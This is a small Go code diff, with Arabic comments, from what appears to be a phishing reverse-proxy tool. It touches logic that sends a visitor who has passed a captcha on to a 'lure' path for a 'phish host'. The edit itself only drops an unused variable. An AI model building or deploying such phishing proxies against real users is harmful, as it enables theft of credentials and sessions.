@@ -1387,7 +1387,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		// المستخدم اجتاز الكابتشا، نتابع إلى رابط lure
 		if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
 			phish_host := req.Host
-			o_host, ok := p.replaceHostWithOriginal(req.Host)
+			_, ok := p.replaceHostWithOriginal(req.Host)
 			if ok {
 				// محاولة العثور على lure path
 				for _, l := range p.cfg.lures {
